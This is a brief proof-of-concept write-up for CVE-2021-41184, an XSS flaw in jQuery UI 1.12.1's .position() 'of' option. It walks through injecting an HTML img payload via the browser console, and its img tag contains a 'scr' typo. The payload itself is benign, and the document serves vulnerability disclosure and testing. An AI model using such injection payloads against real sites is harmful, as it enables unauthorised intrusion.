# Exploit-Medium-CVE-2021-41184

Exploit Medium	CVE-2021-41184 XSS in the `of` option of the `.position()` util

1. jQuery ui version v1.12.1 vulnerable

1.1 https://www.website.com/_js/jquery/jquery-ui-1.12.1/jquery-ui.min.js



------------------------------------------------Concept proof---------------------------------------------------------------



1. Open url 

2. Open inspect 

3. Look for some ID in site elements

3.1 #ID

4. Go to console tab

5. Inject script with ID selected at point 3.1

5.1 Script


	$("#id").position( {
	my: "center",
	at: "right bottom",
	of: "<img scr='https://media.makeameme.org/created/xss-xss-everywhere-5b8065.jpg' src='' />",
	collision: "none"
        });
